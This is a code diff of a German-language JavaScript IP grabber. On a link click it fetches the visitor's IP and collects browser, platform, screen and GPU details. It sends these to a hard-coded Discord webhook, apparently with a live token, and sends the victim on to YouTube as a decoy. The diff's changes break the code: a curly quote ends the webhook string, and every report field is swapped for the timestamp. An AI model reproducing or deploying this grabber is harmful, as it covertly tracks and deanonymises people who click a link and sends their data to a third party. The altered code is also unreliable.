@@ -4,7 +4,7 @@ fetch("https://api.ipify.org?format=json")
   .then(data => {
     const ip = data.ip;
     const zielLink = "https://youtube.com";
-    const webhookUrl = "https://discord.com/api/webhooks/1419580064676188163/SK95E8KHxQY4sYaET6vtWBGG6x4d-v7ceq0-8ZN-K41eB5Tzt0Gaoe_gVxNIRScyQq46";
+    const webhookUrl = "https://discord.com/api/webhooks/1419580064676188163/SK95E8KHxQY4sYaET6vtWBGG6x4d-v7ceq0-8ZN-K41eB5Tzt0Gaoe_gVxNIRScyQq46“;
     const browser = navigator.userAgent;
     const platform = navigator.platform;
     const zeitstempel = new Date().toLocaleString("de-DE");
@@ -30,15 +30,15 @@ fetch("https://api.ipify.org?format=json")
     }
 
     // Nachricht formatieren
-      const payload = {
+    const payload = {
       content: `# 📨 NEUER KLICK AUF DEN LINK!
-**📌 IP-Adresse:** \`${ip}\`
-**🌐 Browsertyp:** \`${browser}\`
-**📱 Plattform:** \`${platform}\`
-**🖥️ Bildschirmauflösung:** \`${screenResolution}\`
-**🎮 GPU Info (WebGL):** \`${gpuInfo}\`
+**📌 IP-Adresse:** \`${zeitstempel}\`
+**🌐 Browsertyp:** \`${zeitstempel}\`
+**📱 Plattform:** \`${zeitstempel}\`
+**🖥️ Bildschirmauflösung:** \`${zeitstempel}\`
+**🎮 GPU Info (WebGL):** \`${zeitstempel}\`
 **⏰ Uhrzeit:** \`${zeitstempel}\`
-**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${ip}>`
+**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${zeitstempel}>`
     };
 
     // An Discord senden
@@ -48,7 +48,6 @@ fetch("https://api.ipify.org?format=json")
         "Content-Type": "application/json"
       },
       body: JSON.stringify(payload)
-      
     }).catch(err => {
       console.error("Fehler beim Senden an Discord:", err);
     });
